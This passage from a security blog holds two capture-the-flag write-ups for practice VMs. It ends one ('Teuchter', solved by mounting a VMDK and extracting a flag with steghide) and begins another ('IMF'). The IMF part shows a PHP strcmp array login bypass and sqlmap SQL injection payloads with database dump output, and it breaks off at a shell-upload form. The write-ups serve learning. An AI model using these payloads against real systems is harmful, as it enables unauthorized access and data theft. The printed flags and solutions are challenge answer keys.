<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@teuchter:/root/re-record-not-fade-away# python3 dir.py
</span><span class='line'>python3 dir.py
</span><span class='line'>Found directory: .
</span><span class='line'>  FeelsLikeHeaven
</span><span class='line'>  dir.py
</span><span class='line'>Found directory: ./on
</span><span class='line'>Found directory: ./on/and
</span><span class='line'>Found directory: ./on/and/on
</span><span class='line'>Found directory: ./on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on/and
</span><span class='line'>Found directory: ./on/and/on/and/on/and/on/and/on/and/ariston
</span><span class='line'>  TeuchterESX.zip</span></code></pre></td></tr></table></div></figure>


<p>Inside this madness there&rsquo;s a 12M archive. Ah moved it to a sane location, transfered it to my machine, and attempted to extract it, but it was password protected. No need for cracking, guessing from all the options, the password is <em>Teuchter</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip TeuchterESX.zip 
</span><span class='line'>Archive:  TeuchterESX.zip
</span><span class='line'>[TeuchterESX.zip] TeuchterESX.vmdk password: 
</span><span class='line'>  inflating: TeuchterESX.vmdk        </span></code></pre></td></tr></table></div></figure>


<p>A VMDK disk. There&rsquo;s actually a hint for this inside root&rsquo;s crontab entries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>## So vmfs-tools package eh....?
</span><span class='line'>*/5 * * * * /bin/sh /usr/local/bin/numpties.sh &gt; /dev/null 2&gt;&1</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what the package does:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-cache show vmfs-tools
</span><span class='line'>Package: vmfs-tools
</span><span class='line'>Source: vmfs-tools (0.2.5-1)
</span><span class='line'>Version: 0.2.5-1+b2
</span><span class='line'>Installed-Size: 256
</span><span class='line'>Maintainer: Mike Hommey &lt;glandium@debian.org&gt;
</span><span class='line'>Architecture: amd64
</span><span class='line'>Depends: libc6 (&gt;= 2.14), libfuse2 (&gt;= 2.6), libuuid1 (&gt;= 2.16)
</span><span class='line'>Size: 53964
</span><span class='line'>SHA256: 39379758d08827726308ea6ccf76de0cc403ba94d1bcdec9127a120bbf4b050a
</span><span class='line'>SHA1: 7db639825b49cabb9d9081dd22ca94813cf335b6
</span><span class='line'>MD5sum: ee9aa037a69d28f6db694632d0f7a106
</span><span class='line'>Description: Tools to access VMFS filesystems
</span><span class='line'> VMFS is a clustered filesystem designed to store virtual machine disks for
</span><span class='line'> VMware ESX or ESXi Server hosts. This set of tools allows to access these
</span><span class='line'> filesystems from some other non ESX/ESXi host for e.g. maintenance tasks.
</span><span class='line'> .
</span><span class='line'> Only read access is available at the moment, but write access is under
</span><span class='line'> works. Multiple extents are supported.
</span><span class='line'> .
</span><span class='line'> The VMFS can be accessed with a command line tool or mounted through a
</span><span class='line'> userspace filesystem (FUSE-based).
</span><span class='line'>Description-md5: 0cdea504f6c5a9da0070eeda2f011352
</span><span class='line'>Tag: admin::filesystem, admin::kernel, admin::virtualization,
</span><span class='line'> implemented-in::c, role::program
</span><span class='line'>Section: otherosfs
</span><span class='line'>Priority: extra
</span><span class='line'>Filename: pool/main/v/vmfs-tools/vmfs-tools_0.2.5-1+b2_amd64.deb</span></code></pre></td></tr></table></div></figure>


<p>Ah installed the package, and then hit a standstill on how to actually mount the virtual disk. After trying several approaches and failing, what worked was attaching the VMDK to my Kali virtual machine from the host. Ah had to change the compatibility of my VM for that to work, but it could possibly also work by editing the VMDK and changing <em>ddb.virtualHWVersion</em> to a version matching the VM&rsquo;s compatibility, but Ah haven&rsquo;t tried that. After doing it like that, Ah was able to see the disk under <em>/dev/sdb1</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fdisk -l
</span><span class='line'>Disk /dev/sdb: 2 GiB, 2147483648 bytes, 4194304 sectors
</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disklabel type: gpt
</span><span class='line'>Disk identifier: AD5D7662-CD00-4621-AF02-68A05AD0A688
</span><span class='line'>
</span><span class='line'>Device     Start     End Sectors Size Type
</span><span class='line'>/dev/sdb1   2048 4194270 4192223   2G VMware VMFS
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
</span><span class='line'>Units: sectors of 1 * 512 = 512 bytes
</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
</span><span class='line'>Disklabel type: dos
</span><span class='line'>Disk identifier: 0xa89dd27d
</span><span class='line'>
</span><span class='line'>Device     Boot    Start      End  Sectors Size Id Type
</span><span class='line'>/dev/sda1  *        2048 79693823 79691776  38G 83 Linux
</span><span class='line'>/dev/sda2       79695870 83884031  4188162   2G  5 Extended
</span><span class='line'>/dev/sda5       79695872 83884031  4188160   2G 82 Linux swap / Solaris</span></code></pre></td></tr></table></div></figure>


<p>Now Ah could mount it and see what&rsquo;s inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# vmfs-fuse /dev/sdb1 /mnt/vmdk
</span><span class='line'>root@kali:~# ls /mnt/vmdk
</span><span class='line'>hint.txt  redkola</span></code></pre></td></tr></table></div></figure>


<p>The hint mentions a password made of 25 characters that we should be able to find from what we&rsquo;ve been through:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat hint.txt 
</span><span class='line'>Almost there.. Check the ISO and remember password relates to the TV Advert ye watched.
</span><span class='line'>
</span><span class='line'>Ah took out the spaces but it's 25 characters but the Wikipedia page will get it for ye.</span></code></pre></td></tr></table></div></figure>


<p>In the redkola (Irn-Bru, anyone?) folder there are more VMDK files, but at least the hint focuses us on the ISO:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>oot@kali:/mnt/vmdk/redkola# ls
</span><span class='line'>redkola_1-flat.vmdk  redkola.iso    redkola.vmsd
</span><span class='line'>redkola_1.vmdk       redkola.nvram  redkola.vmx</span></code></pre></td></tr></table></div></figure>


<p>Ah mounted the ISO next:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -o loop,ro redkola.iso /mnt/redkola
</span><span class='line'>root@kali:/mnt/redkola# ls
</span><span class='line'>glass_ch.jpg</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/teuchter/glass_ch.jpg" title="glass cheque" alt="irn-bru!!!!!!"></p>

<p>All that Irn-Bru! And with something extra, perhaps? Enter steghide!</p>

<h4>steghide</h4>

<blockquote><p>Steghide  is a steganography program that is able to hide data in various kinds of
image- and audio-files. The color- respectivly sample-frequencies  are  not  changed thus making
the embedding resistant against first-order statistical tests.</p>

<p>Features include the compression of the embedded  data,  encryption  of
the  embedded  data  and automatic integrity checking using a checksum.
The JPEG, BMP, WAV and AU file formats are supported for use  as  cover
file. There are no restrictions on the format of the secret data.</p></blockquote>

<p>Steghide can also be used to check for the presence of a secret message and to extract it, if provided the correct passphrase. Putting together all the hints (scotland, girders, irn-bru wiki page) or just watching and listening to the advert gives us the passphrase <code>madeinscotlandfromgirders</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide info glass_ch.jpg 
</span><span class='line'>"glass_ch.jpg":
</span><span class='line'>  format: jpeg
</span><span class='line'>  capacity: 3.9 KB
</span><span class='line'>Try to get information about embedded data ? (y/n) y
</span><span class='line'>Enter passphrase: 
</span><span class='line'>  embedded file "realflag.txt":
</span><span class='line'>    size: 972.0 Byte
</span><span class='line'>    encrypted: rijndael-128, cbc
</span><span class='line'>    compressed: yes</span></code></pre></td></tr></table></div></figure>


<p>Aaand, after much pain, we have the flag!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide extract -sf glass_ch.jpg 
</span><span class='line'>Enter passphrase: 
</span><span class='line'>wrote extracted data to "realflag.txt".</span></code></pre></td></tr></table></div></figure>


<p>Achievement unlocked: Unlimited Irn-Bru!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat realflag.txt 
</span><span class='line'>
</span><span class='line'>Gaun Yersel Big Man! B-)
</span><span class='line'>
</span><span class='line'>Congratulations for the fifth time on capturing this flag!
</span><span class='line'>
</span><span class='line'>Yes, I know this VM has really got on your nerves, and that was the main
</span><span class='line'>point...
</span><span class='line'>
</span><span class='line'>I decided to have some fun with you, and hopefully you have learned some
</span><span class='line'>new ways to look at things. You know, all this could have been avoided
</span><span class='line'>if Siri just leanred what "outwith" means, I wouldn't have to build this
</span><span class='line'>VM. I'm trolling you again of course!
</span><span class='line'>
</span><span class='line'>I hope this VM was fun for you, and I'm sure you can now insult people
</span><span class='line'>in another language :-)
</span><span class='line'>
</span><span class='line'>Thanks to mrb3n who shared a joke with me and pushing me to set up a VM
</span><span class='line'>for trolling everyone.
</span><span class='line'>
</span><span class='line'>Shout-outs yet again to #vulnhub for hosting a great learning tool and
</span><span class='line'>being a great inspiration to make these VMs. A special thanks goes to
</span><span class='line'>mrb3n, cmaddy and GKNSB for repeated testing. Many thanks to g0tM1lk
</span><span class='line'>for providing some valuable feedback and offering to host my CTF again.
</span><span class='line'>                                                           --Knightmare</span></code></pre></td></tr></table></div></figure>


<p>This challenge cost me 1.5 days of the weekend, but it was funny as feck! And Ah learned a couple slang words that will sure come in handy. AND IRN-BRU!!! Which, in case ye haven&rsquo;t figured it out, stands for Iron Brew! Cheers, knightmare!</p>

<p>Just gonna leave this here:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/teuchter/irn-bru.jpg" title="irn-bru" alt="iron brew effect"></p>

<p>And this:</p>

<ul>
<li><a href="https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/">https://foodanddrink.scotsman.com/drink/15-facts-about-irn-bru/</a></li>
</ul>


<p>It&rsquo;s not over:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ When I'm a burger, Ah want to be washed \
</span><span class='line'>\ down with Irn-Bru                      /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack the IMF]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/06/hack-the-imf/"/>
    <updated>2018-10-06T09:45:42+03:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/06/hack-the-imf</id>
    <content type="html"><![CDATA[<p>The VM description states that IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag.</p>

<p>The difficulty is Beginner/Moderate</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: IMF - Homepage</span></code></pre></td></tr></table></div></figure>


<p>Only port 80 is open, so let&rsquo;s begin from there.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/home.png" title="homepage" alt="impossible mission force"></p>

<p>So we learn that IMF stands for Impossible Mission Force and that it&rsquo;s a US intelligence agency. 3-letter agencies everywhere!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/projects.png" title="projects" alt="imf projects"></p>

<p>The Projects page makes for a fun read and it also reveals that the site is using PHP.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/contact.png" title="contact" alt="imf contact"></p>

<p>The contact page gives us some names and mail addresses:</p>

<ul>
<li>Roger S. Michaels &ndash; <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#114;&#x6d;&#105;&#x63;&#104;&#x61;&#101;&#x6c;&#x73;&#64;&#105;&#x6d;&#102;&#x2e;&#108;&#111;&#99;&#97;&#x6c;">&#x72;&#109;&#x69;&#x63;&#x68;&#x61;&#x65;&#108;&#115;&#x40;&#105;&#x6d;&#x66;&#x2e;&#x6c;&#111;&#x63;&#x61;&#108;</a></li>
<li>Alexander B. Keith &ndash; <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x61;&#x6b;&#x65;&#x69;&#116;&#104;&#64;&#105;&#109;&#x66;&#x2e;&#x6c;&#x6f;&#x63;&#97;&#108;">&#x61;&#x6b;&#x65;&#105;&#x74;&#x68;&#x40;&#x69;&#109;&#x66;&#x2e;&#x6c;&#x6f;&#99;&#97;&#108;</a></li>
<li>Elizabeth R. Stone &ndash; <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#101;&#x73;&#116;&#x6f;&#110;&#x65;&#x40;&#105;&#109;&#102;&#46;&#x6c;&#x6f;&#x63;&#97;&#108;">&#x65;&#115;&#116;&#111;&#x6e;&#101;&#x40;&#x69;&#109;&#x66;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#108;</a></li>
</ul>


<h1>Flag #1 &ndash; Read the source</h1>

<p>The first flag can be found as a HTML comment in the source of the contact.php page:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- flag1{YWxsdGhlZmlsZXM=} --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Decoding the base64 flag gives the hint <code>allthefiles</code>.</p>

<h1>Flag #2 &ndash; JS includes</h1>

<p>I interpreted the hint to mean bruteforce, but I tried with multiple tools and wordlists and didn&rsquo;t find anything. Going back through the HTML source, I noticed that several of the included Javascript files look like base64:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>    &lt;script src="js/ZmxhZzJ7YVcxbVl.js"&gt;&lt;/script&gt;
</span><span class='line'>    &lt;script src="js/XUnRhVzVwYzNS.js"&gt;&lt;/script&gt;
</span><span class='line'>    &lt;script src="js/eVlYUnZjZz09fQ==.min.js"&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>Putting them all together gives the string <em>ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==</em>, which yields the second flag when decoded: <em>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</em>. This, in turn, gives the next hint: <code>imfadministrator</code></p>

<h1>Flag #3 &ndash; Exploiting PHP strcmp function</h1>

<p>With no other services available, everything revolves around the site. Using the above hint in the URL takes us to a hastily-made login page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/login.jpg" title="login" alt="login"></p>

<p>And in the source there&rsquo;s an interesting comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Ok, this added an interesting twist that exploits PHP functionality. Since the password is hardcoded, when attempting to log in we&rsquo;d expect a string comparison to be made between the user input and the hardcoded password value. This is done in PHP through the use of the <strong>strcmp()</strong> function:</p>

<p>strcmp(string1,string2)</p>

<p>This function returns:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0 - if the two strings are equal
</span><span class='line'>&lt;0 - if string1 is less than string2
</span><span class='line'>&gt;0 - if string1 is greater than string2</span></code></pre></td></tr></table></div></figure>


<p>However, when reading through its <a href="https://secure.php.net/manual/en/function.strcmp.php">manual page</a>, there was a very interesting comment by chris at unix-ninja dot com:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>strcmp() will return NULL on failure.
</span><span class='line'>
</span><span class='line'>This has the side effect of equating to a match when using an equals comparison (==).
</span><span class='line'>Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return.
</span><span class='line'>
</span><span class='line'>---------------------
</span><span class='line'>  Example
</span><span class='line'>---------------------
</span><span class='line'>
</span><span class='line'>$variable1 = array();
</span><span class='line'>$ans === strcmp($variable1, $variable2);
</span><span class='line'>
</span><span class='line'>This will stop $ans from returning a match;
</span><span class='line'>
</span><span class='line'>Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.</span></code></pre></td></tr></table></div></figure>


<p>If we build on this example, in case the login page was codded with an equals comparison, making the function fail may exhibit the same behavior as if the strings matched. And to do that, we&rsquo;ll have to compare the hardcoded string with something that is not a string, like an array in this example. I used Burp to intercept the POST request that looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user=&lt;input&gt;&pass=&lt;input&gt;</span></code></pre></td></tr></table></div></figure>


<p>For the user, I used Roger&rsquo;s username that we&rsquo;ve discovered earlier. And then passed the password as an array:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user=rmichaels&pass[]=fail</span></code></pre></td></tr></table></div></figure>


<p>And the login succeeded!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag3{Y29udGludWVUT2Ntcw==}
</span><span class='line'>Welcome, rmichaels
</span><span class='line'>IMF CMS</span></code></pre></td></tr></table></div></figure>


<p>The decoded flag says <code>continueTOcms</code>. And that IMF CMS is a link to <a href="http://192.168.145.130/imfadministrator/cms.php?pagename=home">http://192.168.145.130/imfadministrator/cms.php?pagename=home</a></p>

<h1>Flag #4 &ndash; SQLi</h1>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/cms.jpg" title="imf cms" alt="imf cms"></p>

<p>The Upload Report page is under construction. The Disavowed list is redacted:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/list.png" title="list" alt="list"></p>

<p>In the URL, observe how the pages are constructed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cms.php?pagename=disavowlist</span></code></pre></td></tr></table></div></figure>


<p>I tried inserting a single quote in the pagename parameter and sure enough, a SQL error!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29</span></code></pre></td></tr></table></div></figure>


<p>Time for sqlmap!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u http://192.168.145.130/imfadministrator/cms.php?pagename=upload --cookie "PHPSESSID=o5jl7cjuohite8ifu20fghfkq1" --dbms=MySQL --dump-all
</span><span class='line'>
</span><span class='line'>GET parameter 'pagename' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
</span><span class='line'>sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
</span><span class='line'>---
</span><span class='line'>Parameter: pagename (GET)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: AND boolean-based blind - WHERE or HAVING clause
</span><span class='line'>    Payload: pagename=upload' AND 8343=8343 AND 'viDd'='viDd
</span><span class='line'>
</span><span class='line'>    Type: error-based
</span><span class='line'>    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
</span><span class='line'>    Payload: pagename=upload' AND (SELECT 7643 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(7643=7643,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gVxy'='gVxy
</span><span class='line'>
</span><span class='line'>    Type: AND/OR time-based blind
</span><span class='line'>    Title: MySQL &gt;= 5.0.12 AND time-based blind
</span><span class='line'>    Payload: pagename=upload' AND SLEEP(5) AND 'UvGQ'='UvGQ
</span><span class='line'>---
</span><span class='line'>[04:20:24] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
</span><span class='line'>web application technology: Apache 2.4.18
</span><span class='line'>back-end DBMS: MySQL &gt;= 5.0</span></code></pre></td></tr></table></div></figure>


<p>The output was huge, so here I left only the relevant part:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database: admin
</span><span class='line'>Table: pages
</span><span class='line'>[4 entries]
</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>| id | pagename             | pagedata                                                                                                                                                              |
</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</span><span class='line'>| 1  | upload               | Under Construction.                                                                                                                                                   |
</span><span class='line'>| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
</span><span class='line'>| 3  | tutorials-incomplete | Training classrooms available. &lt;br /&gt;&lt;img src="./images/whiteboard.jpg"&gt;&lt;br /&gt; Contact us for training.                                                               |
</span><span class='line'>| 4  | disavowlist          | &lt;h1&gt;Disavowed List&lt;/h1&gt;&lt;img src="./images/redacted.jpg"&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;*********&lt;/li&gt;&lt;li&gt;****** ******&lt;/li&gt;&lt;li&gt;*******&lt;/li&gt;&lt;li&gt;**** ********&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;-Secretary |
</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>The admin DB contains a table with the pages that we&rsquo;ve seen in the CMS, but it looks like there&rsquo;s an extra page we didn&rsquo;t know about! Let&rsquo;s see it!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/tutorials.png" title="tutorials" alt="tutorials"></p>

<p>I used an online barcode reader for the QR code which revealed the flag: <em>flag4{dXBsb2Fkcjk0Mi5waHA=}</em>. And the next hint is <code>uploadr942.php</code></p>

<h1>Flag #5 &ndash; PHP shell upload</h1>

<p>Going to <a href="http://192.168.145.130/imfadministrator/uploadr942.php">http://192.168.145.130/imfadministrator/uploadr942.php</a> takes us to an upload form:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/upload.jpg" title="upload" alt="upload"></p>

